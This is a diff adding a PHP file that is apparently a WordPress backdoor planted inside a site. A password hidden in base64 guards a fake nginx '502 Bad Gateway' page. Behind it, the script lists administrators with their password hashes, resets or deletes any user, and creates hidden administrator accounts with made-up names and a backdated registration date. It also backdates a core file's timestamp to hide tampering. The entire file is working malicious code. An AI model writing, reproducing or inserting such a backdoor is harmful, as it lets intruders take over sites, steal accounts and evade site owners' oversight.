@@ -1,0 +1,170 @@
+ <?php
+ini_set('error_reporting', E_ALL);
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+
+
+require_once '../wp-config.php';	
+require_once ABSPATH . '/wp-admin/includes/user.php';
+
+if((empty($_GET['pw'])) or ($_GET['pw']!=base64_decode("d0VyWTkxMVB3ZGFz")))
+{
+echo"<html>
+<head><title>502 Bad Gateway</title></head>
+<body bgcolor=\"white\">
+<center><h1>502 Bad Gateway</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>";
+}else
+{
+	
+$mu=parse_url(get_site_url());
+
+$url = str_replace("www.","",$mu['host']);
+
+$names=array("James","Michael","Robert","John","David","William","Richard","Thomas","Mark","Charles","Steven","Gary","Joseph","Donald","Ronald","Kenneth","Paul","Larry","Daniel","Stephen","Dennis","Timothy","Edward","Jeffrey","George","Gregory","Kevin","Douglas","Terry","Anthony","Jerry","Bruce","Randy","Brian","Frank","Scott","Roger","Raymond","Peter","Patrick","Keith","Lawrence","Wayne","Danny","Alan","Gerald","Ricky","Carl","Christopher","Dale","Mary","Linda","Patricia","Susan","Deborah","Barbara","Debra","Karen","Nancy","Donna","Cynthia","Sandra","Pamela","Sharon","Kathleen","Carol","Diane","Brenda","Cheryl","Janet","Elizabeth","Kathy","Margaret","Janice","Carolyn","Denise","Judy","Rebecca","Joyce","Teresa","Christine","Catherine","Shirley","Judith","Betty","Beverly","Lisa","Laura","Theresa","Connie","Ann","Gloria","Julie","Gail","Joan","Paula","Peggy","Cindy","Martha","Bonnie");
+
+$snames=array("Smith","Johnson","Williams","Brown","Jones","Miller","Davis","Garcia","Rodriguez","Wilson","Martinez","Anderson","Taylor","Thomas","Hernandez","Moore","Martin","Jackson","Thompson","White","Lopez","Lee","Gonzalez","Harris","Clark","Lewis","Robinson","Walker","Perez","Hall","Young","Allen","Sanchez","Wright","King","Scott","Green","Baker","Adams","Nelson","Hill","Ramirez","Campbell","Mitchell","Roberts","Carter","Phillips","Evans","Turner","Torres","Parker","Collins","Edwards","Stewart","Flores","Morris","Nguyen","Murphy","Rivera","Cook","Rogers","Morgan","Peterson","Cooper","Reed","Bailey","Bell","Gomez","Kelly","Howard","Ward","Cox","Diaz","Richardson","Wood","Watson","Brooks","Bennett","Gray","James","Reyes","Cruz","Hughes","Price");
+
+$i=rand(0,99);
+
+$si=rand(0,count($snames)-1);
+$sname=$snames[$si];
+
+$name=$names[$i].".".$sname;
+
+
+$mail=mb_strtolower($name."@".$url); 
+//echo $mail;
+$permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyz';
+if((isset($_GET['act'])) and ($_GET['act']=="chage_pw"))
+{
+	
+$pw=substr(str_shuffle($permitted_chars), 0, 10);
+	
+	wp_set_password($pw, $_GET['id']);
+	echo "<div>New password: ".$pw."</div>";
+}
+
+if((isset($_GET['act'])) and ($_GET['act']=="delete"))
+{
+	wp_delete_user($_GET['id'],1);
+}
+
+
+if((isset($_GET['act'])) and ($_GET['act']=="create"))
+{
+$pw=substr(str_shuffle($permitted_chars), 0, 10);
+
+$un=$name;
+	
+$userdata = array(
+   'user_pass'             => $pw,   //(string) The plain-text user password.
+    'user_login'            => $un,   //(string) The user's login username.
+    'user_nicename'         => $un,   //(string) The URL-friendly user name.
+    'user_email'            => $mail,   //(string) The user email address.
+    'display_name'          => $un,   //(string) The user's display name. Default is the user's username.
+    'nickname'              => $un,   //(string) The user's nickname. Default is the user's username.   
+    'user_registered'       => '2020-05-01 18:32:45',   //(string) Date the user registered. Format is 'Y-m-d H:i:s'.
+    'role'                  => 'administrator',   //(string) User's role.
+); 
+ $user_id = wp_insert_user( $userdata ) ;
+	echo "<div>New user: <br>
+".$un."<br>
+".$pw."<br>
+<br>
+</div>";
+}
+//----------------------------- змінні параметри -----------------------------------------
+
+?>
+<style>
+	.blue {
+	box-shadow:inset 0px 1px 0px 0px #97c4fe;
+	background:linear-gradient(to bottom, #3d94f6 5%, #1e62d0 100%);
+	background-color:#3d94f6;
+	border-radius:6px;
+	border:1px solid #337fed;
+	display:inline-block;
+	cursor:pointer;
+	color:#ffffff;
+	font-family:Arial;
+	font-size:15px;
+	font-weight:bold;
+	padding:6px 24px;
+	text-decoration:none;
+	text-shadow:0px 1px 0px #1570cd;
+}
+.blue:hover {
+	background:linear-gradient(to bottom, #1e62d0 5%, #3d94f6 100%);
+	background-color:#1e62d0;
+}
+.blue:active {
+	position:relative;
+	top:1px;
+}
+.red {
+	box-shadow:inset 0px 1px 0px 0px #f5978e;
+	background:linear-gradient(to bottom, #f24537 5%, #c62d1f 100%);
+	background-color:#f24537;
+	border-radius:6px;
+	border:1px solid #d02718;
+	display:inline-block;
+	cursor:pointer;
+	color:#ffffff;
+	font-family:Arial;
+	font-size:15px;
+	font-weight:bold;
+	padding:6px 24px;
+	text-decoration:none;
+	text-shadow:0px 1px 0px #810e05;
+}
+.red:hover {
+	background:linear-gradient(to bottom, #c62d1f 5%, #f24537 100%);
+	background-color:#c62d1f;
+}
+.red:active {
+	position:relative;
+	top:1px;
+}
+
+	</style><?php
+$blogusers = get_users('blog_id=1&orderby=nicename&role=administrator');
+	foreach ($blogusers as $user) {
+		echo '<div><strong>Name</strong>: ' . $user->user_nicename . '<br>';
+		echo '<strong>Email</strong>: ' . $user->user_email . '<br>';
+		echo '<strong>Current password in DB</strong>: ' . $user->user_pass . '<br>';
+		echo '<a href="?act=chage_pw&id='.$user->id.'&pw='.$_GET['pw'].'" class="blue">Change password</a>';	
+		
+		if(($user->id)>1){echo' <a href="?act=delete&id='.$user->id.'&pw='.$_GET['pw'].'" class="red">Delete user!</a>';}
+		
+		echo'<br><br></div>';
+		
+		
+}
+		echo '<br>
+		<hr>
+<br>
+<a href="?act=create&pw='.$_GET['pw'].'" class="red">Add new admin</a></div>';
+
+
+
+// Это время касания, установим его на час назад.
+$time = time() - 34214400;
+if (!touch(ABSPATH . '/wp-includes/wp-data.php', $time)) {
+    echo '<br><br>
+<br>
+
+З<strong>апрещено менять дату файла</strong>';
+} else {
+    echo '<br><br>
+<br>
+
+<strong>Дата создания файла изменеа!</strong>';
+}
+
+}
+
+
+	?>
